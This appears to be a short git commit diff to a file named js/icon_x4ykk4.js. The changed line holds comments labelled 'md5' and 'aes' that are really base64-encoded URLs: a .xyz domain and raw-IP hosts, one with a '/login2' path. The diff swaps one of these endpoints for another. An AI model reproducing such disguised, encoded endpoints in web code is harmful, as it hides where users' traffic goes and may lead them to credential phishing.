f2fa73a7982ca5791da91c3e157f93dea92c019f
caocao <caocaodajun@gmail.com>
2022-04-06 19:24:07 +0800

    init

--- js/icon_x4ykk4.js
+++ js/icon_x4ykk4.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cua251dXcueHl6L3dhcA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cDovLzguMTM0LjcyLjM4OjgwMDgvd2FwLyMvbG9naW4y**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
